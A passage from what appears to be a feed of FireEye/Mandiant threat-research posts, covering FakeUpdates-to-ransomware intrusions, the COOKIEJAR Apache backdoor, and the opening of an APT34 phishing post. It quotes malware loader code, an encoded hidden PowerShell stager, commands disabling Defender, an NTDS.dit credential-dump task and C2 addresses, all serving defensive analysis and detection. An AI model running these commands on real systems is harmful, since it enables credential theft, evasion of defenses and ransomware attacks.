 <ul> <li>The malicious script that initialized the callback</li>
    <li>System hostname</li> <li>Current user account</li> <li>Active
    Directory domain</li> <li>Hardware details, such as
  manufacturer</li> <li>Anti-virus software details</li> <li>Running
  processes</li> </ul>
 <p>This activity is nearly identical to the steps observed in our April
  2018 post, indicating only minor changes in data collection during
  this stage. For example, in the earlier iteration of this campaign, we
  did not observe the collection of the script responsible for the C2
  communication. Following the system information gathering, the data is
  subsequently XOR-encoded and sent via another custom HTTP POST request
  request to the same C2 server, with the data included in the parameter
  <b>“b=”</b>. Figure 5 provides a snippet of sample of the second HTTP request.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/headfakeransomware/Picture4.png" alt="" />
  <span class="type-XS">
    <br /> Figure 5: Second HTTP POST request after successful system
    information gathering</span></p>
 <p>Figure 6 provides a copy of the decoded content, showing the various
  data points the malware transmitted back to the C2 server.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><span class="code">0=500<br />
          1=C:\Users\User\AppData\Local\Temp\Chrome.js<br />
          2=AMD64<br />  3=SYSTEM1<br />  4=User<br />  5=4<br />
          6=Windows_NT<br />  7=DOMAIN<br />  8=HP<br />  9=HP
          EliteDesk<br />  10=BIOS_VERSION<br />  11=Windows
          Defender|Vendor Anti-Virus<br />  12=Vendor Anti-Virus|Windows
          Defender|<br />  13=00:00:00:00:00:00<br />  14=Enhanced (101-
          or 102-key)<br />  15=USB Input Device<br />
          16=1024x768<br />  17=System Idle
          Process|System|smss.exe|csrss.exe|wininit.exe|csrss.exe|
          winlogon.exe|services.exe|lsass.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|<br />
      svchost.exe|spoolsv.exe|svchost.exe|svchost.exe|HPLaserJetService.exe|conhost.exe…</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 6: Decoded system information gathered by
    the FakeUpdates malware</span></p>
 <p>After receiving the system information, the C2 server responds with
  an encoded payload delivered via chunked transfer-encoding to the
  infected system. This technique evades conventional IDS/IPS
  appliances, allowing for the second-stage payload to successfully
  download. During our investigations and FireEye Intelligence’s
  monitoring, we recovered encoded payloads that delivered one of the following:</p>
 <ul> <li>Dridex (Figure 7)</li> <li>NetSupport Manage Remote Access
    Tools (RATs) (Figure 8)</li> <li>Chthonic or AZORult (Figure 9)</li> </ul>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><span class="code">    function
          runFile() {<br />          var lastException = '';<br />     
              try {<br />              var wsh = new
          ActiveXObject(&quot;WScript.Shell&quot;);<br />             
          wsh.Run('cmd /C rename &quot;' + _tempFilePathSave + '&quot;
          &quot;' + execFileName + '&quot;');<br />             
          WScript.Sleep(3 * 1000);<br />              runFileResult =
          wsh.Run('&quot;' + _tempFilePathExec + '&quot;');<br />       
                lastException = '';<br />          } catch (error)
          {<br />              lastException = error.number;<br />     
                  runFileExeption += 'error number:' + error.number + '
          message:' + error.message;<br />          }<br />     
      }</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 7: Code excerpt observed in FakeUpdates
    used to launch Dridex payloads</span></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top">    <span class="code">function
          runFile() {<br />          var lastException = '';<br />     
              try {<br />              var wsh = new
          ActiveXObject(&quot;WScript.Shell&quot;);<br />             
          runFileResult = wsh.Run('&quot;' + _tempFilePathExec + '&quot;
          /verysilent');<br />              lastException = '';<br />   
                } catch (error) {<br />              lastException =
          error.number;<br />              runFileExeption += 'error
          number:' + error.number + ' message:' + error.message;<br />
                  }<br />      }</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 8: Code excerpt observed in FakeUpdates
    used to launch NetSupport payloads</span></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><span class="code">    function
          runFile() {<br />          var lastException = '';<br />     
              try {<br />              var wsh = new
          ActiveXObject(&quot;WScript.Shell&quot;);<br />             
          runFileResult = wsh.Run('&quot;' + _tempFilePathExec +
          '&quot;');<br />              lastException = '';<br />       
            } catch (error) {<br />              lastException =
          error.number;<br />              runFileExeption += 'error
          number:' + error.number + ' message:' + error.message;<br />
                  }<br />      }</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 9: Code excerpt observed in FakeUpdates
    used to launch Chthonic and AZORult payloads</span></p>
 <p>During this process, the victim system downloads and executes
  nircmdc.exe, a utility specifically used during the infection process
  to save two system screenshots. Figure 10 provides an example command
  used to capture the desktop screenshots.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><span
          class="code">&quot;C:\Users\User\AppData\Local\Temp\nircmdc.exe&quot;
          savescreenshot
      &quot;C:\Users\User\AppData\Local\Temp\6206a2e3dc14a3d91.png&quot;</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 10: Sample command used to executed the
    Nircmd tool to take desktop screenshots</span></p>
 <p>The PNG screenshots of the infected systems are then transferred to
  the C2 server, after which they are deleted from the system. Figure 11
  provides an example of a HTTP POST request, again with the custom Age
  and User-Agent headers.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/headfakeransomware/Picture5.png" alt="" />
  <span class="type-XS">
    <br /> Figure 11: Screenshots of the infected system are sent to an
    attacker-controlled C2</span></p>
 <p>Interestingly, the screenshot file transfers were neither encoded
  nor obfuscated, as with other data elements transferred by the
  FakeUpdates malware. As soon as the screenshots are transferred,
  nircmdc.exe is deleted.</p>
 <h4>All Hands on Deck</h4>
 <p>In certain investigations, the incident was far from over. Following
  the distribution of Dridex v4 binaries (botnet IDs 199 and 501), new
  tools and frameworks began to appear. FireEye identified the threat
  actors leveraged their Dridex backdoor(s) to execute the
  publicly-available PowerShell <a
  href="https://github.com/EmpireProject/Empire">Empire</a> and/or <a
  href="https://github.com/zerosum0x0/koadic">Koadic</a>
  post-exploitation frameworks. Managed Defense also identified the
  FakeUpdates to Dridex infection chain resulting in the download and
  execution of PoshC2, another publicly available tool. While it could
  be coincidental, it is worth noting that the use of PoshC2 was first
  observed in early September 2019 following the announcement that
  Empire would no longer be maintained and could represent a shift in
  attacker TTPs. These additional tools were often executed between 30
  minutes and 2 hours after initial Dridex download. The pace of the
  initial phases of related attacks possibly suggests that automated
  post-compromise techniques are used in part before interactive
  operator activity occurs.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/headfakeransomware/Picture6.png" alt="" /></p>
 <p>We identified extensive usage of Empire and C2 communication to
  various servers during these investigations. For example, via process
  tracking, we identified a Dridex-injected explorer.exe executing
  malicious PowerShell: a clear sign of an Empire stager:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/headfakeransomware/Picture7.png" alt="" />
  <span class="type-XS">
    <br /> Figure 12: An example of PowerShell Empire stager execution
    revealed during forensic analysis</span></p>
 <p>In the above example, the threat actors instructed the victim system
  to use the remote server 185.122.59[.]78 for command-and-control using
  an <a
    href="https://github.com/EmpireProject/Empire/blob/master/data/agent/agent.ps1">out-of-the-box
    Empire agent C2 configuration</a> for TLS-encrypted backdoor communications.</p>
 <p>During their hands-on post-exploitation activity, the threat actors
  also moved laterally via PowerShell remoting and RDP sessions. FireEye
  identified the use of WMI to create remote PowerShell processes,
  subsequently used to execute Empire stagers on domain-joined systems.
  In one specific case, the time delta between initial Empire backdoor
  and successful lateral movement was under 15 minutes. Another primary
  goal for the threat actor was internal reconnaissance of both the
  local system and domain the computer was joined to. Figure 13 provides
  a snippet of Active Directory reconnaissance commands issued by the
  attacker during one of our investigations.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/headfakeransomware/Picture8.png" alt="" />
  <br /> <span class="type-XS">Figure 13: Attacker executed commands</span></p>
 <p>The threat actors used an Empire module named SessionGopher and the
  venerable Mimikatz to harvest endpoint session and credential
  information. Finally, we also identified the attackers utilized
  Empire’s Invoke-EventVwrBypass, a Windows bypass technique used to
  launch executables using eventvwr.exe, as shown in Figure 14.</p>

 <p>&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;
  -NoP -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows
  Update).Update); powershell -NoP -NonI -W Hidden -enc $x</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/headfakeransomware/Picture9.png" alt="" />
  <br /> <span class="type-XS">Figure 14: PowerShell event viewer bypass</span></p>
 <h4>Ransomware Attacks &amp; Operator Tactics<b></b></h4>
 <p>Within these investigations, FireEye identified the deployment
  BitPaymer or DoppelPaymer ransomware. While these ransomware variants
  are highly similar, DoppelPaymer uses additional obfuscation
  techniques. It also has enhanced capabilities, including an updated
  network discovery mechanism and the requirement of specific
  command-line execution. DoppelPaymer also uses a different encryption
  and padding scheme.</p>
 <p>The ransomware and additional reconnaissance tools were downloaded
  through public sharing website repositories such as DropMeFiles and
  SendSpace. Irrespective of the ransomware deployed, the attacker used
  the SysInternals utlity PSEXEC to distribute and execute the
  ransomware.  </p>
 <p>Notably, in the DoppelPaymer incident, FireEye identified that
  Dridex v2 with the Botnet ID 12333 was downloaded onto the same system
  previously impacted by an instance of Dridex v4 with Botnet ID 501.
  Within days, this secondary Dridex instance was then used to enable
  the distribution of DoppelPaymer ransomware.  Prior to DoppelPaymer,
  the threat actor deleted volume shadow copies and disabled anti-virus
  and anti-malware protections on select systems. Event log artifacts
  revealed commands executed through PowerShell which were used to
  achieve this step (Figure 15):</p>
 <table border="1" cellspacing="0" cellpadding="0" width="100%"> <tbody>
    <tr>
      <td width="31%" valign="top"><p>
          <b>Event Log</b></p> </td> <td width="8%" valign="top"><p>
          <b>EID</b></p> </td> <td width="60%" valign="top"><p>
          <b>Message</b></p> </td> </tr>
    <tr>
      <td width="31%"
        valign="top"><p>Microsoft-Windows-PowerShell%4Operational</p>
      </td> <td width="8%" valign="top"><p>600</p> </td> <td width="60%"
          valign="top"><p> HostApplication=powershell.exe
          Set-MpPreference -DisableRealtimeMonitoring $true</p> </td> </tr>
    <tr>
      <td width="31%"
        valign="top"><p>Microsoft-Windows-PowerShell%4Operational</p>
      </td> <td width="8%" valign="top"><p>600</p> </td> <td width="60%"
          valign="top"><p> HostApplication=powershell.exe
          Uninstall-WindowsFeature -Name Windows-Defender</p> </td> </tr>
    <tr>
      <td width="31%" valign="top"><p>Application</p> </td> <td
        width="8%" valign="top"><p>1034</p> </td> <td width="60%"
          valign="top"><p>Windows Installer removed the product. Product
          Name: McAfee Agent-++-5.06.0011-++-1033-++-1603-++-McAfee,
          Inc.-++-(NULL)-++--++-. Product Version: 82.</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 15: Event log entries related to the
    uninstallation of AV agents and disablement of real-time monitoring</span></p>
 <p>The DoppelPaymer ransomware was found in an Alternate Data Stream
  (ADS) in randomly named files on disk. ADSs are attributes within NTFS
  that allow for a file to have multiple data streams, with only the
  primary being visible in tools such as Windows Explorer. After
  ransomware execution, files are indicated as encrypted by being
  renamed with a “.locked” file extension. In addition to each “.locked”
  file, there is a ransom note with the file name “readme2unlock.txt”
  which provides instructions on how to decrypt files.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/headfakeransomware/Picture11.png" alt="" />
  <br /> <span class="type-XS">Figure 16: DoppelPaymer ransomware note
    observed observed during a Mandiant Incident Response investigation</span></p>
 <h4>Ransomware? Not In My House!</h4>
 <p>Over the past few years, we have seen ransomware graduate from a
  nuisance malware to one being used to extort victim networks out of
  significant sums of money. Furthermore, threat actors are now coupling
  ransomware with multiple toolkits or other malware families to gain
  stronger footholds into an environment. In this blog post alone, we
  witnessed a threat actor move through multiple toolsets - some
  automated, some manual - with the ultimate goal of holding the victim
  organization hostage.</p>
 <p>Ransomware also raises the stakes for unprepared organizations as it
  levels the playing field for all areas of your enterprise. Ransomware
  proves that threat actors don’t need to get access to the most
  sensitive parts of your organization – they need to get access to the
  ones that will disrupt business processes. This widens your attack
  surface, but luckily, also gives you more opportunity for detection
  and response. Mandiant recently published an in depth white paper on
    <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/09/ransomware-protection-and-containment-strategies.html">Ransomware
    Protection and Containment Strategies</a>, which may help
  organizations mitigate the risk of ransomware events.</p>
 <h4>Indicators</h4>
 <p>The following indicator set is a collective representation of
  artifacts identified during investigations into multiple customer compromises.</p>
 <table border="0" cellspacing="0" cellpadding="0" width="100%"> <tbody>
    <tr>
      <td width="15%"><p>
          <b>Type</b></p> </td> <td width="84%"><p>
          <b>Indicator(s)</b></p> </td> </tr>
    <tr>
      <td width="15%"><p>FakeUpdates Files</p> </td> <td
        width="84%"><p>0e470395b2de61f6d975c92dea899b4f</p>
        <p>7503da20d1f83ec2ef2382ac13e238a8</p>
        <p>102ae3b46ddcb3d1d947d4f56c9bf88c</p>
        <p>aaca5e8e163503ff5fadb764433f8abb</p>
        <p>2c444002be9847e38ec0da861f3a702b</p>
        <p>62eaef72d9492a8c8d6112f250c7c4f2</p>
          <p>175dcf0bd1674478fb7d82887a373174<br />
          10eefc485a42fac3b928f960a98dc451<br />
        a2ac7b9c0a049ceecc1f17022f16fdc6</p> </td> </tr>
    <tr>
      <td width="15%"><p>FakeUpdates Domains &amp; IP Addresses</p>
      </td> <td
          width="84%"><p>&lt;8-Characters&gt;.green.mattingsolutions[.]co<br />
          &lt;8-Characters&gt;.www2.haciendarealhoa[.]com<br />
          &lt;8-Characters&gt;.user3.altcoinfan[.]com<br />
          93.95.100[.]178<br /> 130.0.233[.]178<br />
        185.243.115[.]84</p> <p>gnf6.ruscacademy[.]in</p>
        <p>backup.awarfaregaming[.]com</p>
        <p>click.clickanalytics208[.]com</p>
        <p>track.amishbrand[.]com</p>
        <p>track.positiverefreshment[.]org</p>
        <p>link.easycounter210[.]com</p> </td> </tr>
    <tr>
      <td width="15%"><p>nircmdc.exe</p> </td> <td
        width="84%"><p>8136d84d47cb62b4a4fe1f48eb64166e</p> </td> </tr>
    <tr>
      <td width="15%"><p>Dridex</p> </td> <td
        width="84%"><p>7239da273d3a3bfd8d169119670bb745</p>
          <p>72fe19810a9089cd1ec3ac5ddda22d3f<br />
          07b0ce2dd0370392eedb0fc161c99dc7<br />
        c8bb08283e55aed151417a9ad1bc7ad9</p>
        <p>6e05e84c7a993880409d7a0324c10e74</p>
        <p>63d4834f453ffd63336f0851a9d4c632</p>
        <p>0ef5c94779cd7861b5e872cd5e922311</p> </td> </tr>
    <tr>
      <td width="15%"><p>Empire C2</p> </td> <td
        width="84%"><p>185.122.59[.]78</p> <p>109.94.110[.]136</p> </td> </tr></tbody></table>
 <h4>Detecting the Techniques</h4>
 <p>FireEye detects this activity across our platforms, including named
  detections for Dridex, Empire, BitPaymer and DoppelPaymer Ransomware.
  As a result of these investigations, FireEye additionally deployed new
  indicators and signatures to Endpoint and Network Security
  appliances.  This table contains several specific detection names from
  a larger list of detections that were available prior to this activity occurring.</p>
 <table border="0" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="148"><p>
          <b>Platform</b></p> </td> <td width="433"><p>
          <b>Signature Name</b></p> </td> </tr>
    <tr>
      <td width="148"><p> </p> <p>Endpoint Security</p> <p> </p> </td>
        <td width="433"><p>HX Exploit Detection<br /> Empire RAT
          (BACKDOOR)<br /> EVENTVWR PARENT PROCESS (METHODOLOGY)<br />
          Dridex (BACKDOOR)<br /> Dridex A (BACKDOOR)<br /> POWERSHELL
          SSL VERIFICATION DISABLE (METHODOLOGY)<br /> SUSPICIOUS
          POWERSHELL USAGE (METHODOLOGY)<br /> FAKEUPDATES SCREENSHOT
          CAPTURE (METHODOLOGY)</p> </td> </tr>
    <tr>
      <td><p>Network Security</p> </td>
          <td><p>Backdoor.FAKEUPDATES<br />
          Trojan.Downloader.FakeUpdate<br />
          Exploit.Kit.FakeUpdate<br /> Trojan.SSLCert.SocGholish</p>
      </td> </tr></tbody></table>
 <h4>MITRE ATT&amp;CK Technique Mapping</h4>
 <table border="0" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="149" valign="bottom"><p>
          <b>ATT&amp;CK</b></p> </td> <td width="432" valign="bottom"><p>
          <b>Techniques</b></p> </td> </tr>
    <tr>
      <td width="149" valign="bottom"><p>
          <b>Initial Access</b></p> </td> <td width="432"
          valign="bottom"><p>Drive-by Compromise (T1189), Exploit
          Public-Facing Application (T1190)</p> </td> </tr>
    <tr>
      <td width="149" valign="bottom"><p>
          <b>Execution</b></p> </td> <td width="432"
          valign="bottom"><p>PowerShell (T1086), Scripting (T1064), User
          Execution (T1204), Windows Management Instrumentation
        (T1047)</p> </td> </tr>
    <tr>
      <td width="149" valign="bottom"><p>
          <b>Persistence</b></p> </td> <td width="432"
          valign="bottom"><p>DLL Search Order Hijacking (T1038)</p>
      </td> </tr>
    <tr>
      <td width="149" valign="bottom"><p>
          <b>Privilege Escalation</b></p> </td> <td width="432"
          valign="bottom"><p>Bypass User Account Control (T1088), DLL
          Search Order Hijacking (T1038)</p> </td> </tr>
    <tr>
      <td width="149" valign="bottom"><p>
          <b>Defense Evasion</b></p> </td> <td width="432"
          valign="bottom"><p>Bypass User Account Control (T1088),
          Disabling Security Tools (T1089), DLL Search Order Hijacking
          (T1038), File Deletion (T1107), Masquerading (T1036), NTFS
          File Attributes (T1096), Obfuscated Files or Information
          (T1027), Scripting (T1064), Virtualization/Sandbox Evasion
        (T1497)</p> </td> </tr>
    <tr>
      <td width="149" valign="bottom"><p>
          <b>Credential Access</b></p> </td> <td width="432"
          valign="bottom"><p>Credential Dumping (T1003)</p> </td> </tr>
    <tr>
      <td width="149" valign="bottom"><p>
          <b>Discovery</b></p> </td> <td width="432"
          valign="bottom"><p>Account Discovery (T1087), Domain Trust
          Discovery (T1482), File and Directory Discovery (T1083),
          Network Share Discovery (T1135), Process Discovery (T1057),
          Remote System Discovery (T1018), Security Software Discovery
          (T1063), System Information Discovery (T1082), System Network
          Configuration Discovery (T1016), Virtualization/Sandbox
          Evasion (T1497)</p> </td> </tr>
    <tr>
      <td width="149" valign="bottom"><p>
          <b>Lateral Movement</b></p> </td> <td width="432"
          valign="bottom"><p>Remote Desktop Protocol (T1076),  Remote
          File Copy (T1105)</p> </td> </tr>
    <tr>
      <td width="149" valign="bottom"><p>
          <b>Collection</b></p> </td> <td width="432"
          valign="bottom"><p>Data from Local System (T1005), Screen
          Capture (T1113)</p> </td> </tr>
    <tr>
      <td width="149" valign="bottom"><p>
          <b>Command And Control</b></p> </td> <td width="432"
          valign="bottom"><p>Commonly Used Port (T1436), Custom Command
          and Control Protocol (T1094) ,Data Encoding (T1132), Data
          Obfuscation (T1001), Remote Access Tools (T1219), Remote File
          Copy (T1105), Standard Application Layer Protocol (T1071)</p>
      </td> </tr>
    <tr>
      <td width="149" valign="bottom"><p>
          <b>Exfiltration</b></p> </td> <td width="432"
          valign="bottom"><p>Automated Exfiltration (T1020),
          Exfiltration Over Command and Control Channel (T1041)</p>
      </td> </tr>
    <tr>
      <td width="149" valign="bottom"><p>
          <b>Impact</b></p> </td> <td width="432"
          valign="bottom"><p>Data Encrypted for Impact (T1486), Inhibit
          System Recovery (T1490), Service Stop (T1489)</p> </td> </tr></tbody></table>
 <h4>Acknowledgements</h4>
 <p>A huge thanks to James Wyke and Jeremy Kennelly for their analysis
  of this activity and support of this post.</p>
 <p>
  <i>Catch an on-demand recap on this and the <a
      href="https://www.brighttalk.com/webcast/10703/445570">Top 5
      Managed Defense attacks</a> this year.</i></p>
http://www.fireeye.com/blog/threat-research/2019/10/head-fake-tackling-disruptive-ransomware-attacks.html2019-10-01T10:00:00.000Z2020-11-19T19:07:23.871ZCOOKIEJAR: Tracking Adversaries With FireEye Endpoint Security’s Logon
Tracker Modulenoemail@noemail.orgNick Schroeder<p>During a recent investigation at a telecommunications company led by
    <a
    href="/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html">Mandiant
    Managed Defense</a>, our team was tasked with rapidly identifying
  systems that had been accessed by a threat actor using legitimate, but
  compromised domain credentials. This sometimes-challenging task was
  made simple because the customer had enabled the Logon Tracker module
  within their FireEye <a
    href="/content/fireeye-www/en_US/products/endpoint-security.html">Endpoint
  Security</a> product.</p>
 <p>Logon Tracker is an Endpoint Security Innovation Architecture module
  designed to simplify the investigation of lateral movement within
  Windows enterprise environments. Logon Tracker improves the efficiency
  of investigating lateral movement by aggregating historical logon
  activity and provides a mechanism to monitor for new activity. This
  data is presented in a user interface designed for analyzing
  investigative leads (e.g., a compromised account) and hunting for
  suspicious activity (e.g., RDP activity by privileged accounts). Logon
  Tracker also provides a graph interface that enables the
  identification of irregular and unique logons with the option to
  filter on hostnames, usernames, protocol, time of day, process name,
  privilege level, status (success/failure), and more.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/cookiejar/picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Logon Tracker GUI interface</span></p>
 <p>A critical component of a successful incident response is the
  scoping effort to identify systems that may have been accessed by the
  adversary. Windows Event Logs offer a commonly utilized method of
  identifying an adversary’s lateral movement between Windows systems.
  However, as with all log sources, Windows Event Logs are subject to
  data retention limits on endpoints, making the aggregated logon
  activity provided by Logon Tracker a critical source of evidence for
  incident response.</p>
 <p>Logon Tracker’s graphical display along with the raw logon events
  allowed Mandiant Managed Defense to quickly identify 10 potentially
  compromised hosts and begin to create a timeline of adversary activity.</p>
 <p>Managed Defense also leveraged Logon Tracker to monitor for
  additional suspicious logons and adversary activity throughout the
  incident response. Searching for logons (both failed and successful)
  from known compromised accounts and activity originating from
  compromised systems allowed our investigators to quickly determine
  which systems should be prioritized for analysis. Additionally, Logon
  Tracker provides investigators the ability to:</p>
 <ul> <li>Filter logon data for activity originating from user-provided
    IP ranges</li> <li>Search for logon data for activity by specific
    privileged accounts, including “Domain Administrators” and
    “Enterprise Administrators”</li> <li>Search for any privileged logon
    using the “Privileged” logon type</li> <li>Provide alerting and
    definition of custom rules (coming soon!)</li> </ul>
 <h4>Case Background</h4>
 <p>In mid-July, the Managed Defense Security Operations Center
  identified potential credential harvesting activity on a Windows
  server. The activity included the creation of a scheduled task
  configured to execute the built-in Windows utility, NTDSUTIL to take a
  snapshot of the active NTDS.dit file and save it locally to a text
  file as shown in Figure 2:<u></u></p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">&quot;schtasks  /s &lt;redacted&gt; /create
          /tn ntbackup /tr \&quot;ntdsutil snapshot \\\&quot;activate
          instance ntds\\\&quot; create quit quit
          &gt;c:\\Users\\admin\\AppData\\Local\\Temp\\ntds.log\&quot;
          /sc once /st 05:38:00 /sd 07-12-2020 /f</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 2: Scheduled task creation for NTDS.DIT harvesting</span></p>
 <p>The NTDS.dit file is a database that contains Active Directory data
  such as user objects, group memberships, groups, and—more useful to an
  adversary—password hashes for all users in the domain.</p>
 <p>Leveraging Logon Tracker and simple timeline analysis, Managed
  Defense quickly determined an adversary had accessed this system to
  create a scheduled task from a system with a hostname that did not
  match the naming convention used within the environment. An anonymized
  example of Logon Tracker data is shown in Figure 3:</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/cookiejar/picture3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Logon Tracker data</span></p>
 <p>Armed with the suspicious hostname and potentially compromised
  username, Managed Defense then used Logon Tracker’s search
  functionality to determine the scope of systems potentially accessed
  by the adversary.</p>
 <p>The resulting investigation revealed that an Internet-facing
  Customer Relationship Management (CRM) application hosted on a Linux
  Apache web server had been compromised. Multiple web shells had been
  placed within web-accessible folders, allowing an adversary to execute
  arbitrary commands on the server. The adversary leveraged one of these
  web shells to install a malicious Apache module and restart Apache for
  the module to take effect. Mandiant has classified this module as
  COOKIEJAR (see the Malware Appendix at the end of the post for more
  details). The COOKIEJAR module enabled the adversary to proxy through
  the compromised server to any arbitrary IP/port pair within the
  customer’s internal network, see Figure 4.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/cookiejar/picture4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: PCAP data</span></p>
 <p>Using this proxied access to the customer’s network, the adversary
  leveraged previously compromised domain credentials to connect to
  multiple Windows servers using SMB. Due to the use of the proxy to
  connect into the customer’s network, the hostname of the adversary’s
  workstation being used to conduct the attack was also passed into the
  logon events. This type of activity occurs due to the direct
  connection to the customers network and is similar to being on the
  same LAN. The non-standard hostname and non-standard customer naming
  convention used by the adversary help make scoping an easy task.
  Additionally, Managed Defense was able to leverage network detection
  to alert on the authentication attempts and activities of the
  adversary’s host.</p>
 <h4>Malware Appendix</h4>
 <p>During the course of the response, Mandiant identified a customized
  malicious Apache plugin capable of intercepting HTTP requests to an
  Apache HTTP server. The new malware family COOKIEJAR was created to
  aid in clustering and tracking this activity. The COOKIEJAR module
  installs a pre-connection hook that only runs if the client IP address
  matches a specified hardcoded adversary-controlled IP address. It
  listens for SSL/TLS connections on the port specified by the Apache
  server, using a certificate and private key loaded from
    <i>/tmp/cacert.pem </i>and <i>/tmp/privkey.pem</i> respectively. If
  the client IP address matches the hardcoded IP address (Figure 4), the
  backdoor accepts three commands based on the start of the URL:</p>
 <ul> <li>/phpconf_t/: Simply writes
    &lt;html&gt;&lt;h1&gt;accepted.&lt;/h1&gt;&lt;/html&gt; as the
    response. Likely used to test if the server is infected with the
  malware.</li> <li>/phpconf_s/: Executes commands on the server. Any
    communications to and from the system are forwarded to a shell, and
    are AES-256-ECB encrypted and then Base58 encoded.</li>
    <li>/phpconf_p/: Decode the second encoded string provided as a
    hostname/port (the first is ignored), using Base58 and AES-256-ECB
    (same key as before). The server will connect to the remote host and
    act as a proxy for the command and control (C2). Data to and from
    the C2 is encoded using Base58 and AES-256-ECB. Data to and from the
    remote host is not encoded.</li> </ul>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/cookiejar/picture5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: Hardcoded configuration data
    within COOKIEJAR</span></p>
 <h4>Detecting the Techniques</h4>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>Product</b></p> </td> <td width="312" valign="top"><p>
          <b>Signature</b></p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Network Security/MVX</p> </td> <td
        width="312" valign="top"><ul>
          <li>APT.Backdoor.Linux64_COOKIEJAR_1</li>
          <li>APT.Backdoor.Linux_COOKIEJAR_1</li>
          <li>APT.Backdoor.Linux.COOKIEJAR</li> </ul> </td> </tr></tbody></table>
 <h4>Acknowledgements</h4>
 <ul> <li>Chris Gardner, Malware Analyst</li> <li>Fred House, Director,
  Engineering</li> </ul>
 <p>
  <i>More information on FireEye Endpoint Security's </i>
  <a href="https://fireeye.market/apps/292187"><i>Logon Tracker Module</i></a>
  <i> including the module download and user manual are available in the </i>
  <a href="https://fireeye.market/apps/292187"><i>FireEye Marketplace</i></a>
  <i>. Learn more about <a
      href="/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html">Mandiant
      Managed Defense</a>, and catch an on-demand recap on this and
      the <a href="https://www.brighttalk.com/webcast/10703/445570">Top
      5 Managed Defense attacks</a> this year.</i></p>
http://www.fireeye.com/blog/threat-research/2020/08/cookiejar-tracking-adversaries-with-fireeye-endpoint-security-module.html2020-08-11T17:00:00.000Z2020-11-19T19:01:10.346ZHard Pass: Declining APT34’s Invite to Join Their Professional Networknoemail@noemail.orgMatt Bromiley<h4>Background</h4>
 <p>With increasing geopolitical tensions in the Middle East, we expect
  Iran to significantly increase the volume and scope of its cyber
  espionage campaigns. Iran has a critical need for strategic
  intelligence and is likely to fill this gap by conducting espionage
  against decision makers and key organizations that may have
  information that furthers Iran's economic and national security goals.
  The identification of new malware and the creation of additional
  infrastructure to enable such campaigns highlights the increased tempo
  of these operations in support of Iranian interests.</p>
 <h4>FireEye Identifies Phishing Campaign</h4>
 <p>In late June 2019, FireEye identified a phishing campaign conducted
  by APT34, an Iranian-nexus threat actor. Three key attributes caught
  our eye with this particular campaign:</p>
 <ol> <li>Masquerading as a member of Cambridge University to gain
    victims’ trust to open malicious documents,</li> <li>The usage of
    LinkedIn to deliver malicious documents,</li> <li>The addition of
    three new malware families to APT34’s arsenal.</li> </ol>
 <p>FireEye’s platform successfully thwarted this attempted intrusion,
  stopping a new malware variant dead in its tracks. Additionally, with
  the assistance of our FireEye Labs Advanced Reverse Engineering
  (FLARE), Intelligence, and Advanced Practices teams, we identified
  three new malware families and a reappearance of PICKPOCKET, malware
  exclusively observed in use by APT34. The new malware families, which
  we will examine later in this post, show APT34 relying on their
  PowerShell development capabilities, as well as trying their hand at Golang.</p>
 <p>APT34 is an Iran-nexus cluster of cyber espionage activity that has
  been active since at least 2014. They use a mix of public and
  non-public tools to collect strategic information that would benefit
  nation-state interests pertaining to geopolitical and economic needs.
  APT34 aligns with elements of activity reported as OilRig and
  Greenbug, by various security researchers. This threat group has
  conducted broad targeting across a variety of industries operating in
  the Middle East; however, we believe APT34's strongest interest is
  gaining access to financial, energy, and government entities.</p>
 <p>Additional research on APT34 can be found in this <a
    href="https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html">FireEye
    blog post</a>, this <a
    href="https://blog-cert.opmd.fr/dnspionage-focus-on-internal-actions/">CERT-OPMD
  post</a>, and this <a
    href="https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html">Cisco post</a>.</p>
 <p>Mandiant <a
